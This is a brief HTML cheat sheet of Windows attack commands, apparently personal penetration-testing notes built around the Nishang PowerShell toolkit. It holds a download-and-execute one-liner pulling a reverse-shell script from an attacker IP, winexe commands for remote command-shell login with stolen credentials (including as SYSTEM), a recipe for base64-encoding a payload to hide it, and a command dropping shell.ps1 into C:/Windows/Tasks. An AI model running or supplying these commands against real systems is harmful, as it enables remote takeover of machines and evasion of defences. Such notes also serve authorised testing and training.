<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Windows</title>
</head><body><b>Nishang</b>&nbsp;(https://github.com/samratashok/nishang)<br/>
<br/>
<br/>
Invoke-PowershellTcpOneLine.ps1<br/>
<br/>
<br/>
<br/>
<br/>
Invoke-PowerShellTcp.ps1<br/>
<br/>
1. setup python http server<br/>
<br/>
2. execute<br/>
<br/>
<b>powershell.exe IEX(New-Object Net.WebClient).downloadString('http://&lt;ip attacker&gt;/Invoke-PowerShellTcp.ps1")<br/>
<br/>
<br/>
<br/>
</b><b>login to windows machine</b><br/>
<br/>
winexe -U '&lt;username&gt;%&lt;password&gt;' //&lt;ip address&gt; cmd.exe<br/>
winexe -U '&lt;username&gt;%&lt;password&gt;' --system //&lt;ip address&gt; cmd.exe<br/>
<br/>
<br/>
<br/>
encode to windows base64<br/>
Cat Invoke-PowerShellTcpOneLine.ps1 | iconv -t utf-16le |base64 -w 0<br/>
<br/>
powershell -enc &lt;encode payload&gt;<br/>
<br/>
<br/>
<br/>
<i>powershell iwr http://&lt;ip attacker&gt;/shell.ps1 -o C:/Windows/Tasks/shell.ps1</i></body></html>